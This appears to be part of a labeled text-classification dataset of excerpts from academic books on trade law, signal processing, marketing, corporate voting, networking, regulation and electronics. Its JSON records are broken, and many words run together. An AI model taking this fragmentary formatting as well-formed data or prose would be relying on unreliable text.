The other significance of the TRIPS Agreement is that while a multitudeof different treaties on IPRS catered to the governance and administrationof IPRS, the linking of them with trade is through the TRIPS Agreementand it brought IPRS within the realm of the dispute settlement mechanismof the WTO. The Understanding on Rules and Procedures of Governing theSettlement of Disputes in the WTO, commonly referred to as Dispute SettlementUnderstanding (DSU), covers the TRIPS.306 The mandatory surrender to thedispute resolution mechanism of the WTO with appeal provisions before theAppellate Body (AB) of the WTO, a permanent standing body, made the TRIPSunique in comparison with any of the other treaties on different IPRS.307 This completely changed the scenario since it was no longer just the indus-trialised nations that would need to provide effective protection of IPRS, butall members would need to have a common minimum threshold of protection(subject to certain transition time flexibility). This minimum threshold wasmuch higher than that followed in the municipal laws of many GATT mem-bers at the time when TRIPS became part of the WTO system with the signingof GATT 1994.","label":"legal"}

This fact allows us to derive a bank of WDFs, one per sensor, and obtaina time-domain realization of the same beamformer which is less computationallydemanding than its counterpart implemented in the frequency domain. The proposedbeamforming method is extremely efficient, as it requires at most two multipliers andone delay for each filter, where the necessary number of filters equals the numberof physical microphones of the array, and it avoids the use of fractional delays. Theupdate of the coefficients of the filters, required for reshaping the beampattern, hasa significantly lower computational cost with respect to the time-domain methodspresented in the literature [18].","label":"technical"}

The Holistic Vision of Brand Management 7http:\/\/dx.doi.org\/10.5772\/intechopen.71303 The service-dominant logic is based on the assumption that at the core of the exchangerelationship between firm and markets, there are \u201cservices\u201d and not simple outputs ofproductive processes as \"goods or services.\u201d Therefore, the market exchange is seen as acollaboration process between firm and customers, where customers take an endogenousposition during the process being involved in the creation of value and not just target of it. Using the S-D logic, the vision of the unilateral creation of value by the firm with the con-sumers as target and users of this value is passed by the adoption of a vision of co-creationof value through collaborative processes and a mutual exchange of services (knowledgeand skills) between firm and customer. But there is something more in the S-D logic thatthe exchange whose protagonist is that the firm does not occur just with its consumersbut with all the stakeholders, the firm interacts with more or less directly and more or lessintense [28]. Therefore, it can be considered not a value-in use referred just to consumers buta value-in-context to include multiple stakeholders and multiple markets in the concept ofcreated value. All these concepts elaborated at first by Vargo and Lusch [23] related to marketing in gen-eral have been subsequently investigated and applied also to the specific brand managementcontext, considering the fact the relational dimension of the brand was emphasized so asits \"identification\" functions both for the producer and the user.","label":"marketing"}

Every subjectin the more active group has fitted trajectories above the recommended 30 minutesof exercise. Most of the population does not get the recommended allowance of dailyphysical activity and this is well-supported in our analysis.

With this method, by placing as many votes aspossible for each director, Ted could cast 6,000 votes for each of his desireddirectors. Thus each of Ted's directors would receive 6,000 votes, while each of Boband Carol's directors would receive only 4,000. Under cumulative voting, however,each shareholder has as many votes as there are directors to be elected. Hence withcumulative voting Bob and Carol could strategically distribute their 20,000 votes(4,000 votes multiplied by five directors) among the candidates to ensurerepresentation on the board. By placing 10,000 votes each on two of theircandidates, they would be guaranteed two positions on the board. ( The candidatesfrom the two slates are not matched against each other on a one-to-one basis;instead, the five candidates with the highest number of votes are elected.) Variousformulas and computer programs are available to determine how votes should beallocated, but the principle underlying the calculations is this: cumulative voting isdemocratic in that it allows the shareholders who own 40 percent of the stock-Boband Carol-to elect 40 percent of the board.

Shaving products are a vital market for Gillette,and Schick has become an increasingly formidable competitor since its acquisition by Energizer. Finally, Gillettewas very capable of responding, given its vast resources and its dominant role in the industry. Because all threefactors were high, a strong response was likely. Indeed, Gillette made a preemptive strike with the introduction ofthe Sensor 3 and Venus Devine a month before the Schick Quattro's projected introduction. Although examining a firm's awareness, motivation, and capability is important, the results of a series of movesand countermoves are often difficult to predict and miscalculations can be costly.","label":"strategy_and_planning"}

{"text":"The signatures might live in a slower memory hash table, one for each signaturelength, or other lookup structure. By using a smaller Bloom filter in faster memory to record the setof signature strings in each table, the number of lookups can be reduced; in the common case, noslower lookups will be required, and false-positives will only minimally affect performance if theyare kept sufficiently small. This use of a Bloom filter as a method to filter out requests to a slower orotherwise more costly lookup structure when we expect most lookups to be unsuccessful providesa common application of Bloom filters in real systems. Another notable early use of Bloom filters innetworking is to provide a sketch of the contents of a web cache, to allow cooperative caching [23,56].Instead of passing around lists of URLs, machines can pass around more space-efficient Bloom filters. The effects of false-positives, which can make a machine look to a local neighbor for a document thatis not actually stored before then going to the web for it, can be made suitably small to still allow forimproved performance.","label":"technical"}

To overcome this issue,hardware and software acceleration is often used, together with sampling tech-niques to monitor network packets at line speed, but these artifacts are usuallyunavailable in cloud infrastructures and IoT devices. Moreover, they usuallyprovide many monitoring, inspection, and transformation features, resulting ina non-negligible resource footprint. This overhead is perfectly acceptable formonitoring big infrastructures for a large number of threats, but it becomesunnecessarily overwhelming when the analysis is restricted to threats for a spe-cific service.

Where localized sounds are really useful is in pro-viding an orienting cue or warning about events occurring behind the user, outside of the field of vision. There is also a well-known phenomenon called visual capture of sound. Given a sound and an appar-ent visual source for the sound, for example, a talking face on a cinema screen, the sound is perceived tocome from the source despite the fact that the actual source may be off to one side. Thus, visual localiza-tion tends to dominate auditory localization when both kinds of cues are present.","label":"technical"}

An appropriate economicanalysis includes at least three basic elements: (1) identifying the need for the proposed action;(2) an examination of alternative approaches; and (3) an evaluation of the benefits and costs, bothquantitative and qualitative, of the proposed action and the main alternatives identified by theanalysis.443 Executive Order 12866 was issued in 1993 with the aim of making the federal regulatory processmore efficient and reducing the burden of regulation.444 Executive Order 12866 directs ExecutiveBranch agencies to follow certain principles, including adopting a regulation only after a reasoneddetermination that the benefits of the intended regulation justify its costs. Subsequently, ExecutiveOrder 13563445 was issued in 2011 to reaffirm Executive Order 12866 and supplement it withadditional principles, such as retrospective analysis of existing rules. As independent regulatory agencies, the CFTC and the SEC are not subject to Executive Orders12866 and 13563.

For example, after the stock market crash in 1929 and the widespread bank failures of1930-1933, the Glass-Steagall Act was passed in 1933 to establish the Federal DepositInsurance Corporation (FDIC) and take measures to reduce market speculation. Asecond Glass-Steagall Act, which was passed the same year and officially named theBanking Act of 1933, separated investment and commercial banking to reduce potentialconflicts of interest when a bank is issuing securities for a firm that it is also lending to. In 1999, however, after years of economic expansion and at the height of the tech stockbubble, the Gramm-Leach-Bliley Act effectively repealed the Banking Act of 1933,opening the way for the consolidation of the banking industry.

Rather thaninfluencing h directly, modern EBL employs the domain theory to transform the hypothesis space Hinto a more effective one, O. The domain theory encodes useful expert-supplied distinctions. Thesedistinctions form new features derivable from A. Given a subset \u00de of these new features (the ones thatare likely to be useful for the problem at hand), an enhanced hypothesis space is formed by allowing\u2117 to participate on equal footing with the original raw features used in H.

Defined as relatively stable interaction patterns that are based on mutualnormative expectations on how to behave legitimately (Gl\u00fcckler & Bathelt,2017), institutions are hard to identify in real-life interactions. However,the concept of relational infrastructure enables making institutions visible,based on the idea that \"because institutions are means of providing regu-larity to behaviour, they are always underpinned by networks of persons\"(Storper, 2018, 213). Although institutions are not reducible to their net-works, it is these inter-personal and inter-organisational linkages that ena-ble the communication and alignment of social norms and legitimate beliefs,and help visualise the establishment of corresponding interaction patternsas observable manifestations of institutions (Gl\u00fcckler, Punstein, Wuttke, &Kirchner, 2020; Storper, 2018). For example, Storper (2018) found that themore successful development of the San Francisco Bay Area comparedto Greater Los Angeles was due to the former's relational infrastructure,comprised of informal networks, elite leadership networks, cross-networkconnections, and organisational sites that facilitate and sustain such cross-over links. In applying the framework of relational infrastructure, Gl\u00fcckleret al. ( 2020) were also able to explain the otherwise inexplicable economicsuccess of the German region of Heilbronn-Franconia, based on strongfirm-internal bonds, disconnection in terms of work collaboration betweenfirms, but cohesive non-business networks within the home region.","label":"strategy_and_planning"}

With the development of communication technologies andthe increasing bandwidth of optical fibres and transmission speeds incurrent 5G and future 6G wireless networks, there is a growing demandfor solutions organising traffic in such networks, taking into account bothend-to-end transmissions and the possibility of data processing by edgeservices. The most pressing problems of today's computer networks arenot only bandwidth and transmission delays, but also security and energyconsumption, which is becoming increasingly important in today's cli-mate. This paper presents a solution based on neural networks thatorganises network traffic taking into account the above criteria - qualityof service (QoS), energy consumption and security.

The decline in the number of FCMs, however, means that clearing customers have feweroptions for their business and makes it more difficult for customers of a defaulting clearing firm tomove their positions and collateral to another firm.

At a higher level of abstraction,the instructions in the lowest-level modules may be replaced conceptually by the functions ofthose modules. At progressively higher levels of abstraction, the functions of higher-levelmodules conceptually replace the implementations of those modules in terms of lower-levelmodules and instructions, until finally, one is left with nothing but the ultimate function of theprogram.... A program has structure at every level of abstraction at which it is viewed. At lowlevels of abstraction, a program's structure may be quite complex; at the highest level it is trivial.

Each link is composed of a separate shielded twisted pair running in each direction.1000BASE-T: This option makes use of four pairs of Category 5 unshielded twisted pair to supportdevices over a range of up to 100 m. In recent years, 10 Gbps Ethernet switches have made considerable inroads in the LAN market. Theprincipal driving requirement for 10 Gigabit Ethernet is the increase in Internet and intranet traffic. A number of factors contribute to the explosive growth in both Internet and intranet traffic: An increase in the number of network connections An increase in the connection speed of each end-station (e.g., 10 Mbps users moving to 100 Mbps,analog 56 kbps users moving to DSL and cable modems) An increase in the deployment of bandwidth-intensive applications such as high-quality videoAn increase in Web hosting and application hosting traffic Initially, network managers are using 10 Gbps Ethernet to provide high-speed, local backboneinterconnection between large-capacity switches.

After the popularity of bigmodels, the inference of these big models requires more expensive high-end devicesthan conventional deep models, making the compression process more critical.

{"text":"Afterforming, RRAM can exhibit bipolar resistive switching, where the application of apositive voltage can induce an increase of conductance, or set transition, whereasthe application of a negative voltage can lead to reset transition, or a decrease ofconductance [20]. Figure 4.2 schematically shows the 2 states of a RRAM device, namely the resetstate (left), or high resistance state (HRS), where the filamentary path of defects isdisconnected because of a previous reset transition. Under a positive voltage appliedto the TE, defects from the top reservoir migrate toward the depleted gap, thus leadingto the set state (right), or low resistance state (LRS), via a set transition. Applying anegative voltage to the TE causes the retraction of defects from the filament towardthe top reservoir, and the formation of the depleted gap [20]. Note that the TE and BEgenerally differ by material and\/or structure, with the TE being generally chemicallyactive, e.g., Ti, Hf, or Ta, which enables the creation of an oxygen exchange layerwith a relatively high concentration of oxygen vacancies [21]. On the other hand, theBE is chemically inert to prevent set transition when a positive voltage is applied tothe BE [22].","label":"technical"}

If we take accountability to mean opening up algorithms to questionby data subjects and their representatives, this STS approach promptssome important challenges. We need to get close to the everyday life inwhich the algorithm participates in order to make sense of the relationsthrough which it accomplishes its effects. We need to make this everydaylife of the algorithm open to question. But then we also need to knowsomething about how the algorithm is itself involved in accounting foreveryday life.

{"text":"In Hufford v Samsung Electronics (UK)Ltd.76 e.g. the claimant proved defect and damage but was unable to discharge theburden of proof that a fridge-freezer caused a fire in their home. Such difficultiesled some member states and consumer groups to call for the Product LiabilityDirective to be amended either to reverse the burden of proof or to adopt a pre-sumption of producer liability.77 Recently, the Expert Group on Liability and NewTechnologies78 has suggested that the burden of proof could be linked to compli-ance with specific cybersecurity obligations set by law: the noncompliance wouldlead to a reversal in the burden of proof. Perhaps unsurprisingly, producers andinsurers contest these proposals.7\u2079 A related issue is whether consumers can only rely on uncontested scientificresearch to prove the causal link or if national laws can provide for a lower thresh-old. An answer can be found in the recent N.
